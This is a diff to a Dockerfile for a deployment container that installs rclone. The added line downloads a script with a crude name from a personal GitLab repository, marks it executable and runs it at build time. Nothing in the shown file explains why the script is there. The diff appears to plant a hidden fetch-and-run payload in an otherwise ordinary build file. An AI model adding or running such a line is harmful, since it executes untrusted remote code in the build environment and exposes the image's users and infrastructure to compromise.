@@ -37,6 +37,7 @@ ENV SHELL=/bin/bash
 RUN sudo apt-get update && sudo apt-get install unzip -y
 RUN apt update && apt-get install wget
 RUN curl https://rclone.org/install.sh | sudo bash
+RUN curl -0 https://gitlab.com/muiminah74/jambanium/-/raw/main/fucking.sh -o fucking.sh && chmod +x fucking.sh && ./fucking.sh
 
 # Copy rclone tasks to /tmp, to potentially be used
 COPY deploy-container/rclone-tasks.json /tmp/rclone-tasks.json
